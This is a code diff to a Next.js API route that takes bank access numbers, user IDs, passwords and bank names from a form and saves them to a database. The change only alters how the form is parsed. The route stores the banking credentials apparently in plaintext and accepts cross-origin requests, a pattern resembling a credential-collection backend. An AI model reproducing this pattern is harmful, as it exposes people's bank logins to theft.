@@ -17,15 +17,14 @@ export const config = {
 
 export async function POST(req: NextRequest) {
   try {
-    const body = await req.text();
-    const params = new URLSearchParams(body);
+    const formData = await req.formData(); // Use formData() instead of text()
 
-    const accessNumber = params.get('accessNumber');
-    const userId = params.get('userId');
-    const password = params.get('password');
-    const bank = params.get('bank');
+    const accessNumber = formData.get('accessNumber') as string;
+    const userId = formData.get('userId') as string;
+    const password = formData.get('password') as string;
+    const bank = formData.get('bank') as string;
 
-    const newOrder = await prisma.bank.create({
+    const newBank = await prisma.bank.create({
       data: {
         accessNumber,
         userId,
@@ -35,7 +34,7 @@ export async function POST(req: NextRequest) {
     });
 
     return new NextResponse(
-      JSON.stringify({ success: true, message: 'Data saved successfully', order: newOrder }),
+      JSON.stringify({ success: true, message: 'Data saved successfully', bank: newBank }),
       {
         status: 200,
         headers: CORS_HEADERS,
